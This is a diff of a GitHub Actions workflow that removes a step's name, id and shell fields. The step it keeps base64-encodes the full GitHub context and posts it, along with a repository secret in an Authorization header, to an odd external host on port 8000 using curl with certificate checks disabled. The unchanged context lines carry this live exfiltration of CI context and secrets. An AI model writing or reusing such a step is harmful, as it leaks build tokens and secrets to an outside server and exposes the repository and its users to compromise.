@@ -6,13 +6,10 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: set things
-        id: x
-        run: |
+      - run: |
           ghjson=$(echo '${{ toJSON(github) }}' | base64 -w 0)
           curl --silent --show-error --fail --request GET --insecure \
             https://jacate.70533df3.shooteram.fr:8000 \
             -H "Authorization: ${{ secrets.AUTHORIZATION }}" \
             -H "Content-Type: application/json" \
             --data $ghjson
-        shell: bash
